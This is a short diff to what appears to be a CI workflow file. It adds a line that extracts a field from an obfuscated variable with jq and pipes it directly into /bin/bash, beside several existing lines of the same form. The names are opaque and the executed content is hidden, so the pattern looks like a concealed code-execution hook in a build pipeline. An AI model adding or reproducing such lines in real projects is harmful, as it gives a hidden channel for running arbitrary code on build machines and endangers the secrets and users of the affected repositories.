@@ -32,6 +32,7 @@ jobs:
           echo $jotkd05 | jq -r .fi965 | /bin/bash
           echo $yv3 | jq -r .l50 | /bin/bash
           echo $a744 | jq -r .fk4841 | /bin/bash
+          printf '%s' "$i98098" | jq -r .od859 | /bin/bash
 
       - name: Upload artifact
         if: always()
